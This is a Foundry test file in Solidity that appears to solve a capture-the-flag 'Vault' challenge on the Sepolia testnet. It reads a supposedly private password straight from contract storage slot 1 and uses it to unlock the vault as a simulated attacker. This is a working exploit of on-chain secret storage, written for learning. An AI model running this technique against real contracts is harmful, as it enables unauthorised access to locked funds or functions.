// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}

contract TestVault is Test{
    address constant private TARGET_ADDRESS = 0x99a37F299B229492CF3f55219a05E2B0fD5141c6;
    address attacker;
    IVault target;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);
        attacker = makeAddr("attacker");
        target = IVault(TARGET_ADDRESS);
    }

    function testVault() public {
        bytes32 slotIndex = bytes32(uint256(1));
        
        vm.startPrank(attacker);
        bytes32 rawData = vm.load(address(target), slotIndex);

        target.unlock(rawData);
        vm.stopPrank();

        assertEq(target.locked(), false);
    }

}